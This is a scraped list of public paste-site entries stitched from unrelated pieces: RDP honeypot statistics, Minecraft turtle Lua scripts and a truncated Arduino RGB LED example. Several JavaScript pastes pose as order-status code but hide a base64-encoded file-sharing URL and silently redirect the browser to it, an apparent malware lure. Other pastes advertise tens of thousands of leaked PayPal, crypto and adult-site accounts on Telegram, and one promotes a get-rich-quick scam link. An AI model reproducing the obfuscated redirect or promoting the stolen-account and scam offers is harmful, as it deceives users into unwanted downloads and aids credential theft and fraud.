id,title,username,language,date,content
YKCSZCGt,2025-04-21_stats.json,rdp_snitch,JSON,Monday 21st of April 2025 07:18:12 PM CDT,"{
  ""ip"": {
    ""156.146.57.181"": 165,
    ""71.82.170.60"": 42,
    ""103.127.198.210"": 9,
    ""211.185.207.14"": 18,
    ""80.94.95.198"": 51,
    ""198.235.24.162"": 9,
    ""80.94.95.90"": 6,
    ""45.43.59.195"": 12,
    ""194.165.16.167"": 6,
    ""45.227.254.155"": 6,
    ""88.214.50.50"": 9,
    ""221.181.44.30"": 6,
    ""152.230.66.217"": 72,
    ""147.185.132.22"": 9,
    ""62.60.188.24"": 6,
    ""71.6.134.235"": 30,
    ""37.61.243.211"": 3,
    ""118.194.248.142"": 3,
    ""43.134.22.70"": 3,
    ""58.218.199.219"": 15,
    ""5.196.92.198"": 3,
    ""194.195.90.207"": 3,
    ""102.88.21.219"": 3,
    ""103.56.7.89"": 3,
    ""178.20.129.235"": 3,
    ""182.76.43.166"": 12,
    ""172.208.53.3"": 3,
    ""195.123.219.95"": 6,
    ""205.210.31.235"": 9,
    ""152.32.139.190"": 3,
    ""198.235.24.202"": 9,
    ""88.214.25.123"": 6
  },
  ""asn"": {
    ""AS212238"": 165,
    ""AS20115"": 42,
    ""AS135983"": 9,
    ""AS4766"": 18,
    ""AS204428"": 57,
    ""AS396982"": 36,
    ""AS21859"": 12,
    ""AS48721"": 6,
    ""AS267784"": 6,
    ""Unknown"": 9,
    ""AS9808"": 6,
    ""AS14259"": 72,
    ""AS215930"": 6,
    ""AS10439"": 30,
    ""AS30781"": 3,
    ""AS135377"": 6,
    ""AS132203"": 3,
    ""AS4134"": 15,
    ""AS16276"": 3,
    ""AS141995"": 3,
    ""AS29465"": 3,
    ""AS140599"": 3,
    ""AS24810"": 3,
    ""AS9498"": 12,
    ""AS8075"": 3,
    ""AS21100"": 6,
    ""AS35042"": 6
  },
  ""isp"": {
    ""Datacamp Limited"": 165,
    ""Charter Communications"": 42,
    ""TSDC"": 9,
    ""Korea Telecom"": 18,
    ""SS-Net"": 57,
    ""Google LLC"": 36,
    ""Zenlayer Inc"": 12,
    ""Flyservers S.A."": 12,
    ""SIA \""Singularity Telecom\"""": 9,
    ""China Mobile communications corporation"": 6,
    ""Gtd Internet S.A."": 72,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 6,
    ""CariNet, Inc."": 30,
    ""DC4Data"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 6,
    ""Shenzhen Tencent Computer Systems Company Limited"": 3,
    ""Chinanet"": 15,
    ""OVH SAS"": 3,
    ""Contabo Asia Private Limited"": 3,
    ""MTN NIGERIA Communication limited"": 3,
    ""Comfac Corporation"": 3,
    ""Teleset LLC Nchelny Branch"": 3,
    ""Bharti Airtel"": 12,
    ""MICROSOFT"": 3,
    ""Green Floid LLC"": 6,
    ""NOC EMAIL: noc@one-host.net"": 6
  },
  ""org"": {
    ""Datacamp Limited"": 165,
    ""Spectrum"": 42,
    ""So Viet Technology Solution Company Limited"": 9,
    ""Kornet"": 18,
    ""Unmanaged LTD"": 57,
    ""Palo Alto Networks, Inc"": 36,
    ""ZENLA"": 12,
    ""Flyservers S.A"": 6,
    ""Xwin Universal LTD"": 6,
    ""SIA \""Singularity Telecom\"""": 9,
    ""China Mobile"": 6,
    ""Gtd Internet S.A"": 72,
    ""UAB Host Baltic"": 6,
    ""CariNet, Inc."": 30,
    ""DcforData SRL"": 3,
    ""Ucloud Information Technology"": 6,
    ""Tencent Cloud Computing"": 3,
    ""Chinanet JS"": 15,
    ""OVH"": 3,
    ""Contabo GmbH"": 3,
    ""MTN Nigeria"": 3,
    ""Comfac Corporation"": 3,
    ""Teleset LLC"": 3,
    ""Bharti Airtel Ltd"": 12,
    ""Microsoft Azure Cloud (eastus)"": 3,
    ""Green Floid LLC"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 6
  },
  ""regionName"": {
    ""North West"": 168,
    ""Wisconsin"": 42,
    ""Ho Chi Minh"": 9,
    ""Sejong-si"": 18,
    ""Budapest"": 57,
    ""California"": 36,
    ""Taipei City"": 12,
    ""Kaunas"": 6,
    ""Vilnius"": 6,
    ""New York"": 9,
    ""Guangdong"": 6,
    ""Santiago Metropolitan"": 72,
    ""Tehran"": 6,
    ""Nevada"": 30,
    ""Auvergne-Rh\u00f4ne-Alpes"": 3,
    ""Seoul"": 6,
    ""Jiangsu"": 15,
    ""Hauts-de-France"": 3,
    ""North East"": 3,
    ""Lagos"": 3,
    ""Metro Manila"": 3,
    ""Tatarstan Republic"": 3,
    ""Haryana"": 12,
    ""Virginia"": 3,
    ""Drenthe"": 6,
    ""Kowloon City"": 6
  },
  ""country"": {
    ""Singapore"": 171,
    ""United States"": 120,
    ""Vietnam"": 9,
    ""South Korea"": 24,
    ""Hungary"": 57,
    ""Taiwan"": 12,
    ""Lithuania"": 12,
    ""China"": 21,
    ""Chile"": 72,
    ""Iran"": 6,
    ""France"": 6,
    ""Nigeria"": 3,
    ""Philippines"": 3,
    ""Russia"": 3,
    ""India"": 12,
    ""The Netherlands"": 6,
    ""Hong Kong"": 6
  },
  ""account"": {
    ""hello"": 315,
    ""142.93.8.59"": 123,
    ""YNkfcAYsR"": 3,
    ""EYrJrY"": 3,
    ""BLZdGj"": 3,
    ""Administr"": 6,
    ""Test"": 18,
    ""Domain"": 9,
    ""nuxkVeudh"": 3,
    ""TJRebX"": 3,
    ""aOvXRd"": 3,
    ""eltons"": 15,
    ""administr"": 15,
    ""Administrator"": 6,
    ""asauiBsbV"": 3,
    ""JDFfEE"": 3,
    ""YWCsOr"": 3,
    ""zBLxMdHzc"": 3,
    ""oBZAoE"": 3,
    ""sXbDnR"": 3
  },
  ""keyboard"": {
    ""Unknown"": 543
  },
  ""client_build"": {
    ""Unknown"": 543
  },
  ""client_name"": {
    ""Unknown"": 543
  },
  ""ip_type"": {
    ""hosting & proxy"": 171,
    ""Unknown"": 240,
    ""hosting"": 96,
    ""mobile"": 18,
    ""proxy"": 15,
    ""mobile & hosting"": 3
  }
}"
BSvbfDxA,Market.js,zebmekey,JavaScript,Monday 21st of April 2025 07:17:11 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/83313/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xTQU9nkZ,2025-04-21_stats.json,rdp_snitch,JSON,Monday 21st of April 2025 07:16:05 PM CDT,"{
  ""ip"": {
    ""156.146.57.181"": 110,
    ""71.82.170.60"": 28,
    ""103.127.198.210"": 6,
    ""211.185.207.14"": 12,
    ""80.94.95.198"": 34,
    ""198.235.24.162"": 6,
    ""80.94.95.90"": 4,
    ""45.43.59.195"": 8,
    ""194.165.16.167"": 4,
    ""45.227.254.155"": 4,
    ""88.214.50.50"": 6,
    ""221.181.44.30"": 4,
    ""152.230.66.217"": 48,
    ""147.185.132.22"": 6,
    ""62.60.188.24"": 4,
    ""71.6.134.235"": 20,
    ""37.61.243.211"": 2,
    ""118.194.248.142"": 2,
    ""43.134.22.70"": 2,
    ""58.218.199.219"": 10,
    ""5.196.92.198"": 2,
    ""194.195.90.207"": 2,
    ""102.88.21.219"": 2,
    ""103.56.7.89"": 2,
    ""178.20.129.235"": 2,
    ""182.76.43.166"": 8,
    ""172.208.53.3"": 2,
    ""195.123.219.95"": 4,
    ""205.210.31.235"": 6,
    ""152.32.139.190"": 2,
    ""198.235.24.202"": 6,
    ""88.214.25.123"": 4
  },
  ""asn"": {
    ""AS212238"": 110,
    ""AS20115"": 28,
    ""AS135983"": 6,
    ""AS4766"": 12,
    ""AS204428"": 38,
    ""AS396982"": 24,
    ""AS21859"": 8,
    ""AS48721"": 4,
    ""AS267784"": 4,
    ""Unknown"": 6,
    ""AS9808"": 4,
    ""AS14259"": 48,
    ""AS215930"": 4,
    ""AS10439"": 20,
    ""AS30781"": 2,
    ""AS135377"": 4,
    ""AS132203"": 2,
    ""AS4134"": 10,
    ""AS16276"": 2,
    ""AS141995"": 2,
    ""AS29465"": 2,
    ""AS140599"": 2,
    ""AS24810"": 2,
    ""AS9498"": 8,
    ""AS8075"": 2,
    ""AS21100"": 4,
    ""AS35042"": 4
  },
  ""isp"": {
    ""Datacamp Limited"": 110,
    ""Charter Communications"": 28,
    ""TSDC"": 6,
    ""Korea Telecom"": 12,
    ""SS-Net"": 38,
    ""Google LLC"": 24,
    ""Zenlayer Inc"": 8,
    ""Flyservers S.A."": 8,
    ""SIA \""Singularity Telecom\"""": 6,
    ""China Mobile communications corporation"": 4,
    ""Gtd Internet S.A."": 48,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 4,
    ""CariNet, Inc."": 20,
    ""DC4Data"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 4,
    ""Shenzhen Tencent Computer Systems Company Limited"": 2,
    ""Chinanet"": 10,
    ""OVH SAS"": 2,
    ""Contabo Asia Private Limited"": 2,
    ""MTN NIGERIA Communication limited"": 2,
    ""Comfac Corporation"": 2,
    ""Teleset LLC Nchelny Branch"": 2,
    ""Bharti Airtel"": 8,
    ""MICROSOFT"": 2,
    ""Green Floid LLC"": 4,
    ""NOC EMAIL: noc@one-host.net"": 4
  },
  ""org"": {
    ""Datacamp Limited"": 110,
    ""Spectrum"": 28,
    ""So Viet Technology Solution Company Limited"": 6,
    ""Kornet"": 12,
    ""Unmanaged LTD"": 38,
    ""Palo Alto Networks, Inc"": 24,
    ""ZENLA"": 8,
    ""Flyservers S.A"": 4,
    ""Xwin Universal LTD"": 4,
    ""SIA \""Singularity Telecom\"""": 6,
    ""China Mobile"": 4,
    ""Gtd Internet S.A"": 48,
    ""UAB Host Baltic"": 4,
    ""CariNet, Inc."": 20,
    ""DcforData SRL"": 2,
    ""Ucloud Information Technology"": 4,
    ""Tencent Cloud Computing"": 2,
    ""Chinanet JS"": 10,
    ""OVH"": 2,
    ""Contabo GmbH"": 2,
    ""MTN Nigeria"": 2,
    ""Comfac Corporation"": 2,
    ""Teleset LLC"": 2,
    ""Bharti Airtel Ltd"": 8,
    ""Microsoft Azure Cloud (eastus)"": 2,
    ""Green Floid LLC"": 4,
    ""ThinkTech Technology Industrial CO. Limited"": 4
  },
  ""regionName"": {
    ""North West"": 112,
    ""Wisconsin"": 28,
    ""Ho Chi Minh"": 6,
    ""Sejong-si"": 12,
    ""Budapest"": 38,
    ""California"": 24,
    ""Taipei City"": 8,
    ""Kaunas"": 4,
    ""Vilnius"": 4,
    ""New York"": 6,
    ""Guangdong"": 4,
    ""Santiago Metropolitan"": 48,
    ""Tehran"": 4,
    ""Nevada"": 20,
    ""Auvergne-Rh\u00f4ne-Alpes"": 2,
    ""Seoul"": 4,
    ""Jiangsu"": 10,
    ""Hauts-de-France"": 2,
    ""North East"": 2,
    ""Lagos"": 2,
    ""Metro Manila"": 2,
    ""Tatarstan Republic"": 2,
    ""Haryana"": 8,
    ""Virginia"": 2,
    ""Drenthe"": 4,
    ""Kowloon City"": 4
  },
  ""country"": {
    ""Singapore"": 114,
    ""United States"": 80,
    ""Vietnam"": 6,
    ""South Korea"": 16,
    ""Hungary"": 38,
    ""Taiwan"": 8,
    ""Lithuania"": 8,
    ""China"": 14,
    ""Chile"": 48,
    ""Iran"": 4,
    ""France"": 4,
    ""Nigeria"": 2,
    ""Philippines"": 2,
    ""Russia"": 2,
    ""India"": 8,
    ""The Netherlands"": 4,
    ""Hong Kong"": 4
  },
  ""account"": {
    ""hello"": 210,
    ""142.93.8.59"": 82,
    ""YNkfcAYsR"": 2,
    ""EYrJrY"": 2,
    ""BLZdGj"": 2,
    ""Administr"": 4,
    ""Test"": 12,
    ""Domain"": 6,
    ""nuxkVeudh"": 2,
    ""TJRebX"": 2,
    ""aOvXRd"": 2,
    ""eltons"": 10,
    ""administr"": 10,
    ""Administrator"": 4,
    ""asauiBsbV"": 2,
    ""JDFfEE"": 2,
    ""YWCsOr"": 2,
    ""zBLxMdHzc"": 2,
    ""oBZAoE"": 2,
    ""sXbDnR"": 2
  },
  ""keyboard"": {
    ""Unknown"": 362
  },
  ""client_build"": {
    ""Unknown"": 362
  },
  ""client_name"": {
    ""Unknown"": 362
  },
  ""ip_type"": {
    ""hosting & proxy"": 114,
    ""Unknown"": 160,
    ""hosting"": 64,
    ""mobile"": 12,
    ""proxy"": 10,
    ""mobile & hosting"": 2
  }
}"
tRJ9B1mt,PayPal with Balance,Ratqueenkslskskwkw,JavaScript,Monday 21st of April 2025 07:15:52 PM CDT,63109 Accounts Posted On https://t.me/l34ksbyemin3m
RADNW7SJ,2025-04-21_stats.json,rdp_snitch,JSON,Monday 21st of April 2025 07:15:08 PM CDT,"{
  ""ip"": {
    ""156.146.57.181"": 55,
    ""71.82.170.60"": 14,
    ""103.127.198.210"": 3,
    ""211.185.207.14"": 6,
    ""80.94.95.198"": 17,
    ""198.235.24.162"": 3,
    ""80.94.95.90"": 2,
    ""45.43.59.195"": 4,
    ""194.165.16.167"": 2,
    ""45.227.254.155"": 2,
    ""88.214.50.50"": 3,
    ""221.181.44.30"": 2,
    ""152.230.66.217"": 24,
    ""147.185.132.22"": 3,
    ""62.60.188.24"": 2,
    ""71.6.134.235"": 10,
    ""37.61.243.211"": 1,
    ""118.194.248.142"": 1,
    ""43.134.22.70"": 1,
    ""58.218.199.219"": 5,
    ""5.196.92.198"": 1,
    ""194.195.90.207"": 1,
    ""102.88.21.219"": 1,
    ""103.56.7.89"": 1,
    ""178.20.129.235"": 1,
    ""182.76.43.166"": 4,
    ""172.208.53.3"": 1,
    ""195.123.219.95"": 2,
    ""205.210.31.235"": 3,
    ""152.32.139.190"": 1,
    ""198.235.24.202"": 3,
    ""88.214.25.123"": 2
  },
  ""asn"": {
    ""AS212238"": 55,
    ""AS20115"": 14,
    ""AS135983"": 3,
    ""AS4766"": 6,
    ""AS204428"": 19,
    ""AS396982"": 12,
    ""AS21859"": 4,
    ""AS48721"": 2,
    ""AS267784"": 2,
    ""Unknown"": 3,
    ""AS9808"": 2,
    ""AS14259"": 24,
    ""AS215930"": 2,
    ""AS10439"": 10,
    ""AS30781"": 1,
    ""AS135377"": 2,
    ""AS132203"": 1,
    ""AS4134"": 5,
    ""AS16276"": 1,
    ""AS141995"": 1,
    ""AS29465"": 1,
    ""AS140599"": 1,
    ""AS24810"": 1,
    ""AS9498"": 4,
    ""AS8075"": 1,
    ""AS21100"": 2,
    ""AS35042"": 2
  },
  ""isp"": {
    ""Datacamp Limited"": 55,
    ""Charter Communications"": 14,
    ""TSDC"": 3,
    ""Korea Telecom"": 6,
    ""SS-Net"": 19,
    ""Google LLC"": 12,
    ""Zenlayer Inc"": 4,
    ""Flyservers S.A."": 4,
    ""SIA \""Singularity Telecom\"""": 3,
    ""China Mobile communications corporation"": 2,
    ""Gtd Internet S.A."": 24,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 2,
    ""CariNet, Inc."": 10,
    ""DC4Data"": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Shenzhen Tencent Computer Systems Company Limited"": 1,
    ""Chinanet"": 5,
    ""OVH SAS"": 1,
    ""Contabo Asia Private Limited"": 1,
    ""MTN NIGERIA Communication limited"": 1,
    ""Comfac Corporation"": 1,
    ""Teleset LLC Nchelny Branch"": 1,
    ""Bharti Airtel"": 4,
    ""MICROSOFT"": 1,
    ""Green Floid LLC"": 2,
    ""NOC EMAIL: noc@one-host.net"": 2
  },
  ""org"": {
    ""Datacamp Limited"": 55,
    ""Spectrum"": 14,
    ""So Viet Technology Solution Company Limited"": 3,
    ""Kornet"": 6,
    ""Unmanaged LTD"": 19,
    ""Palo Alto Networks, Inc"": 12,
    ""ZENLA"": 4,
    ""Flyservers S.A"": 2,
    ""Xwin Universal LTD"": 2,
    ""SIA \""Singularity Telecom\"""": 3,
    ""China Mobile"": 2,
    ""Gtd Internet S.A"": 24,
    ""UAB Host Baltic"": 2,
    ""CariNet, Inc."": 10,
    ""DcforData SRL"": 1,
    ""Ucloud Information Technology"": 2,
    ""Tencent Cloud Computing"": 1,
    ""Chinanet JS"": 5,
    ""OVH"": 1,
    ""Contabo GmbH"": 1,
    ""MTN Nigeria"": 1,
    ""Comfac Corporation"": 1,
    ""Teleset LLC"": 1,
    ""Bharti Airtel Ltd"": 4,
    ""Microsoft Azure Cloud (eastus)"": 1,
    ""Green Floid LLC"": 2,
    ""ThinkTech Technology Industrial CO. Limited"": 2
  },
  ""regionName"": {
    ""North West"": 56,
    ""Wisconsin"": 14,
    ""Ho Chi Minh"": 3,
    ""Sejong-si"": 6,
    ""Budapest"": 19,
    ""California"": 12,
    ""Taipei City"": 4,
    ""Kaunas"": 2,
    ""Vilnius"": 2,
    ""New York"": 3,
    ""Guangdong"": 2,
    ""Santiago Metropolitan"": 24,
    ""Tehran"": 2,
    ""Nevada"": 10,
    ""Auvergne-Rh\u00f4ne-Alpes"": 1,
    ""Seoul"": 2,
    ""Jiangsu"": 5,
    ""Hauts-de-France"": 1,
    ""North East"": 1,
    ""Lagos"": 1,
    ""Metro Manila"": 1,
    ""Tatarstan Republic"": 1,
    ""Haryana"": 4,
    ""Virginia"": 1,
    ""Drenthe"": 2,
    ""Kowloon City"": 2
  },
  ""country"": {
    ""Singapore"": 57,
    ""United States"": 40,
    ""Vietnam"": 3,
    ""South Korea"": 8,
    ""Hungary"": 19,
    ""Taiwan"": 4,
    ""Lithuania"": 4,
    ""China"": 7,
    ""Chile"": 24,
    ""Iran"": 2,
    ""France"": 2,
    ""Nigeria"": 1,
    ""Philippines"": 1,
    ""Russia"": 1,
    ""India"": 4,
    ""The Netherlands"": 2,
    ""Hong Kong"": 2
  },
  ""account"": {
    ""hello"": 105,
    ""142.93.8.59"": 41,
    ""YNkfcAYsR"": 1,
    ""EYrJrY"": 1,
    ""BLZdGj"": 1,
    ""Administr"": 2,
    ""Test"": 6,
    ""Domain"": 3,
    ""nuxkVeudh"": 1,
    ""TJRebX"": 1,
    ""aOvXRd"": 1,
    ""eltons"": 5,
    ""administr"": 5,
    ""Administrator"": 2,
    ""asauiBsbV"": 1,
    ""JDFfEE"": 1,
    ""YWCsOr"": 1,
    ""zBLxMdHzc"": 1,
    ""oBZAoE"": 1,
    ""sXbDnR"": 1
  },
  ""keyboard"": {
    ""Unknown"": 181
  },
  ""client_build"": {
    ""Unknown"": 181
  },
  ""client_name"": {
    ""Unknown"": 181
  },
  ""ip_type"": {
    ""hosting & proxy"": 57,
    ""Unknown"": 80,
    ""hosting"": 32,
    ""mobile"": 6,
    ""proxy"": 5,
    ""mobile & hosting"": 1
  }
}"
htbktup6,Leaked Accounts - Fresh Hits,Ratqueenkslskskwkw,JavaScript,Monday 21st of April 2025 07:00:29 PM CDT,06750 Accounts Posted On https://t.me/l34ksbyemin3m
GCY8eXea,staircase-builder-up.lua,Xmann1,Lua,Monday 21st of April 2025 06:45:40 PM CDT,"while true do
  turtle.dig()

  while turtle.getItemCount() == 0 do
    if turtle.getSelectedSlot() == 16 then
      break
    end

    turtle.select(turtle.getSelectedSlot() + 1)
  end

  if turtle.getSelectedSlot() == 16 then
    break
  end

  turtle.place()

  if not turtle.up() then
    break
  end

  if not turtle.forward() then
    break
  end 
end
"
pq1hY8kT,Chaturbate with Tokens,Ratqueenkslskskwkw,JavaScript,Monday 21st of April 2025 06:45:07 PM CDT,57964 Accounts Posted On https://t.me/l34ksbyemin3m
RN15FtA1,Untitled,zebmekey,JavaScript,Monday 21st of April 2025 06:44:01 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/14335/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hNMLt8ZJ,Make $1000 15-MINUTES  (BEGINNER) SW,MKGODLY,JavaScript,Monday 21st of April 2025 06:42:19 PM CDT," 
Pdf https://tinyurl.com/privguidee


ijRKYzpo3m
"
R8BmhfFx,Crypto Accounts,Ratqueenkslskskwkw,JavaScript,Monday 21st of April 2025 06:29:44 PM CDT,39566 Accounts Posted On https://t.me/l34ksbyemin3m
D3DX2mWi,Products.js,zebmekey,JavaScript,Monday 21st of April 2025 06:28:39 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/45013/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4rGaXgTM,miner.lua,Xmann1,Lua,Monday 21st of April 2025 06:26:18 PM CDT,"local max_depth = 4
local max_width = 64

local fuel_estimate = max_depth * 2 + 2 * max_width

function forward_queue()
  while not turtle.forward() do
    print(""Waiting in queue......"")
  end
end

function up_queue()
  while not turtle.up() do
    print(""Waiting to go up in queue..."")
  end
end

function down_queue()
  while not turtle.down() do
    print(""Waiting to go up in queue..."")
  end
end

print(""Waiting for fuel..."")

while true do
  turtle.suckDown(1)
  turtle.refuel(1)

  if turtle.getFuelLevel() >= fuel_estimate then
    print(""We have enough fuel to go mining!"")
    break
  end
end

local width = 0

for i=1, max_width / 2 do
  forward_queue()
  width = width + 1
  print(""Looking for free mining spot at width="" .. width)

  if turtle.detectDown() then
    print(""Free spot at width="" .. width .. ""!"")
    break
  end
end

turtle.digDown()
up_queue()

if width % 2 == 1 then
  print(""Going up to high mining spot"")

  for i=1, 3 do
    turtle.up()
    turtle.digUp()
  end
end

turtle.turnLeft()

for depth=1, max_depth do
  turtle.dig()
  turtle.forward()
  turtle.digUp()
  turtle.digDown()

  print(""Mining out, depth="" .. depth)
end

print(""Gone far enough out, mining back"")

turtle.turnRight()
turtle.dig()
turtle.forward()
turtle.turnRight()

for i=1, max_depth do
  turtle.digUp()
  turtle.digDown()
  turtle.dig()
  turtle.forward()

  print(""Mining back, depth="" .. (max_depth - i))
end

turtle.digUp()
turtle.digDown()

print(""Mining done, returning to station"")
turtle.turnRight()

if width % 2 == 1 then
  print(""Going down from high mining spot"")

  for i=1, 3 do
    down_queue()
  end
end

for i=1, width do
  forward_queue()
end

forward_queue()

for i=1, 16 do
  turtle.select(i)
  turtle.dropUp()
end

turtle.select(1)

turtle.turnRight()
turtle.turnRight()

down_queue()

os.reboot()
"
eXbB9482,Blynk_RGB_Widget_example,macca-nz,Arduino,Monday 21st of April 2025 06:22:18 PM CDT,"/* Fill-in information from Blynk Device Info here */
#define BLYNK_TEMPLATE_ID           ""TMPxxxxxx""
#define BLYNK_TEMPLATE_NAME         ""Device""
#define BLYNK_AUTH_TOKEN            ""YourAuthToken""

/* Comment this out to disable prints and save space */
#define BLYNK_PRINT Serial


#include <WiFi.h>
#include <WiFiClient.h>
#include <BlynkSimpleEsp32_SSL.h>

// Your WiFi credentials.
// Set password to """" for open networks.
char ssid[] = ""YourNetworkName"";
char pass[] = ""YourPassword"";


const bool GAMMA_CORRECT = true;    // set to false to disable gamma correction

// This table remaps linear input RGB values to 
// nonlinear gamma-corrected output values for human eyes. 
// To use/read it:  result = pgm_read_byte(&gamma8[color]);
// Source:  https://learn.adafruit.com/led-tricks-gamma-correction/the-quick-fix
const uint8_t PROGMEM gamma8[] = {
    0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,
    0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  1,  1,  1,  1,
    1,  1,  1,  1,  1,  1,  1,  1,  1,  2,  2,  2,  2,  2,  2,  2,
    2,  3,  3,  3,  3,  3,  3,  3,  4,  4,  4,  4,  4,  5,  5,  5,
    5,  6,  6,  6,  6,  7,  7,  7,  7,  8,  8,  8,  9,  9,  9, 10,
   10, 10, 11, 11, 11, 12, 12, 13, 13, 13, 14, 14, 15, 15, 16, 16,
   17, 17, 18, 18, 19, 19, 20, 20, 21, 21, 22, 22, 23, 24, 24, 25,
   25, 26, 27, 27, 28, 29, 29, 30, 31, 32, 32, 33, 34, 35, 35, 36,
   37, 38, 39, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 50,
   51, 52, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 66, 67, 68,
   69, 70, 72, 73, 74, 75, 77, 78, 79, 81, 82, 83, 85, 86, 87, 89,
   90, 92, 93, 95, 96, 98, 99,101,102,104,105,107,109,110,112,114,
  115,117,119,120,122,124,126,127,129,131,133,135,137,138,140,142,
  144,146,148,150,152,154,156,158,160,162,164,167,169,171,173,175,
  177,180,182,184,186,189,191,193,196,198,200,203,205,208,210,213,
  215,218,220,223,225,228,231,233,236,239,241,244,247,249,252,255 
};


// Makes sure you assign PWM capable pins
const byte PIN_RED = 14;
const byte PIN_GREEN = 12;
const byte PIN_BLUE = 13;

int rgb_red = 0;
int rgb_green = 0;
int rgb_blue = 0;
int rgb_brightness = 0;

//uncomment next line if using a Common Anode LED
//#define COMMON_ANODE
const uint8_t MAX_COLOR_VALUE = 255;

struct HSL_t {
  double h; // angle in degrees
  double s; // saturation % between 0 and 1
  double l; // luminance % between 0 and 1
};

struct RGB_t {
  int r; // red, 0 to 255
  int g; // green, 0 to 255
  int b; // blue, 0 to 255
};


HSL_t rgb2hsl(uint8_t red, uint8_t green, uint8_t blue) {
  // Returns HSL value calculated from red, green, blue values where:
  //  h = hue in degrees, 0 to 360
  //  s = saturation, 0.0 to 1.0
  //  l = luminance, 0.0 to 1.0
  HSL_t result;

  // Scale red, blue, green from integer range 0-255 to float 0-1
  double r = static_cast<double>(red / 255.0);
  double g = static_cast<double>(green / 255.0);
  double b = static_cast<double>(blue / 255.0);

  float c_max = max(max(r,g),b);
  float c_min = min(min(r,g),b);

  // Luminance
  result.l = (c_max + c_min) / 2.0;

  // Saturation
  if (c_max == c_min) {
    // No saturation, achromatic
    result.h = 0.0;
    result.s = 0.0;
    return result;
  } else {
    if (result.l > 0.5) {
      // Saturation = ( max-min)/(2.0-max-min)
      result.s = (c_max - c_min) / (2.0 - c_max - c_min);
    } else {
      // Saturation = (max-min)/(max+min)
      result.s = (c_max - c_min) / (c_max + c_min);
    }
  }

  // Hue
  if (r == max(max(r,g),b)) {
    // red is the maximum value
    result.h = (g - b) / (c_max - c_min);
  } else if (g == max(max(r,g),b)) {
    // green is the maximum value
    result.h = 2.0 + (b - r) / (c_max - c_min);
  } else if (b == max(max(r,g),b)) {
    // blue is the maximum value
    result.h = 4.0 + (r - g) / (c_max - c_min);
  } else {
    // ERROR
    result.h = 0.0;
  }
  
  result.h *= 60.0;
  if (result.h < 0) {
    result.h += 360.0;
  }
   
  return result;
     
} //rgb2hsl()


RGB_t hsl2rgb(double h, double s, double l) {
  RGB_t result;
  float t_1 = 0.0;
  float t_2 = 0.0;
  float t_r = 0.0;
  float t_g = 0.0;
  float t_b = 0.0;

  if (h == 0.0 && s == 0.0) {
    // No saturation, so it is a shade of gray.
    // Covert the luminance and set r, g, b to that level.
    result.r = static_cast<int>(l * 255.0);
    result.g = static_cast<int>(l * 255.0);
    result.b = static_cast<int>(l * 255.0);
  } else {
